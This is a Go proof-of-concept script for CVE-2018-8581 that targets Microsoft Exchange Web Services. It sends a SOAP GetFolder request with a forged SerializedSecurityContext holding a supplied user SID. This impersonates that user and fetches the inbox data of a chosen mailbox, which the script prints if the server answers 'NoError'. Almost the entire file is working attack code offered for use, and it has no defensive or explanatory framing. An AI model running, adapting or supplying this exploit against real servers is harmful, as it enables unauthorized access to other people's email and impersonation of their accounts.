package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"

	"github.com/beevik/etree"
)

func main() {
	fmt.Println("Usage: ./cve_2018_8581 url email sid")
	targeturl := os.Args[1]
	email := os.Args[2]
	sid := os.Args[3]

	client := &http.Client{}
	req, err := http.NewRequest("POST", targeturl+"/EWS/Exchange.asmx", strings.NewReader(SoapBody(email, sid)))
	if err != nil {
		panic(err)
	}
	req.Header.Set("Content-Type", "text/xml; charset=utf-8")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 AttackEx (KHTML, like Gecko) Version/5.1 Safari/534.50")
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(body); err != nil {
		panic(err)
	}

	respcode := doc.FindElement("//resp")
	if respcode != nil && respcode.Text() == "NoError" {
		fmt.Println("[+] The target might vulnerable.")
		fmt.Println("Response:")
		fmt.Println(string(body))
	} else {
		fmt.Println("[-] The target is not vulnerable.")
	}
}

func SoapBody(email string, sid string) string {
	return `<?xml version="1.0" encoding="utf-8"?>
	<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	  <soap:Header>
		<t:RequestServerVersion Version="Exchange2016"/>
		<t:SerializedSecurityContext>
		  <t:UserSid>` + sid + `</t:UserSid>
		  <t:GroupSids>
			<t:GroupIdentifier>
			  <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
			</t:GroupIdentifier>
		  </t:GroupSids>
		</t:SerializedSecurityContext>
	  </soap:Header>
	  <soap:Body >
		<m:GetFolder >
		  <m:FolderShape>
			<t:BaseShape>AllProperties</t:BaseShape>
		  </m:FolderShape>
		  <m:DistinguishedFolderId Id="inbox">
			<t:Mailbox>` + email + `</t:Mailbox> 
		  </m:DistinguishedFolderId> 
	   </m:GetFolder> 
	  </soap:Body> 
   </soap:Envelope>`
}
